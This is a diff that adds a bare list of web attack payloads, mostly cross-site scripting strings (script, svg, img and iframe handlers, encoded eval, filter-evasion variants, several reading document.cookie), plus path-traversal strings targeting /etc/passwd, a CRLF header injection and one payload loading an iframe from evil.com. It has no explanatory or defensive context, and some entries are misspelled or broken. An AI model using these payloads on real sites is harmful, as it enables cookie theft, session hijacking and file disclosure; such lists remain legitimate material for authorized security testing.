@@ -1,0 +1,68 @@
+">'><details/open/ontoggle=confirm('XSS')> 
+<</p>iframe src=javascript:alert()// 
+<img src=x:alert(alt) onerror=eval(src) alt=xss> 
+<a href="javascript&#x3ax=1;alert(1)">click 
+"&#58", "&#x3ax=1;" 
+</script><script>prompt(document.domain)</script> 
+<style/><img src="z'z</style><script/z>alert(1)</script>"> 
+<svg/OnLoad="`${prompt``}`"> 
+"><x/Onpointerrawupdate=confirm(document.cookie)>kira_deathnote 
+ <p>He bugs<i>The hacker</i>,hack.</p>  
+</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;> 
+</script><!--><svg onload=["_Y000!_"].find%26%2340;alert%26rpar;> 
+≋ "><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋ 
+<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”>  
+<iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))> 
+<font color="red">Bugs</font> 
+abcabc\"><svg/onload=confirm(1)> 
+x"autofocus/onfocus=lert(/O/)+" 
+javascript:prompt(document.cookie);// 
+<svg onload=confirm(document.domain)> 
+<imsofake%20onpointerrawupdate=window[%27alert%27](0)>xss 
+<</div>script</div>>alert()<</div>/script</div>> 
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> 
+sdf<script>alert(12)</script> 
+<script> src="{https)://server.com/xss.js"> 
+<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt; 
+LFI -   Accept: ../../../../../../../../../etc/passwd{{ 
+GET /root:x:0:0:root:/root:/bin/bash 
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd 
+%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E 
+javascript:alert(document.cookie)// 
+">'><details/open/ontoggle=confirm('XSS')> 
+-alert(1)//\ 
+''-prompt`1`-'', 
+''-confirm`1`-'', 
+<math><xxlink:href=javascript:confirm`1`>click 
+"oncut="alert() 
+*/</script><!-- 
+ */.domain)/*xxx 
+*/(document/*xx 
+"><script>/*xss 
+*/prompt/*xxxxx 
+"><img src="xasdasdasd" onerror="document.write('<iframe src=http://evil.com></iframe>')" /> 
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> 
+'"<svg/onload=prompt(5);>((7*7}} 
+<svg onload="alert(1)" <=''' svg=''' 
+<Svg='''' onload='''' 
+%E5%98%8A%E5%98%8DSet-Cookie:%20test 
+“onmouseover=alert(document.domain)” 
+?t=test'*self['alert'](document['domain'])*'test 
+onerror=eval;throw'=alert\x28document\x2edomain\x29'; 
+[Click Me](javascript:alert('xss')) 
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"> 
+ "><img src=x onerror=prompt(document.cookie);> 
+<script>window.location='https://www.google.com'</script> 
+<script>alert(document.cookies)</script> 
+<svg onload="alert(document.cookies)"> 
+"'<svg/onload=prompt(document.cookie);> 
+"><img src=x onerror=prompt(document.cookie);> 
+<ScRipT>AlErT("hello");</script> 
+"></script><ScRipT>AlErT("hello");</script> 
+<input type="text" name="state" value="INPUT_FROM_USER"> 
+<IFRAME src=javasript:alert("hackingmonks");"></IFRAME> 
+<IFRAME src=");"></IFRAME> 
+"><img src=x onerror=prompt``> 
+"><img src=x onerror=alert(1)> 
+<img src=xss onerror=alert(1)> 
+<svg onload=alert(hi)>
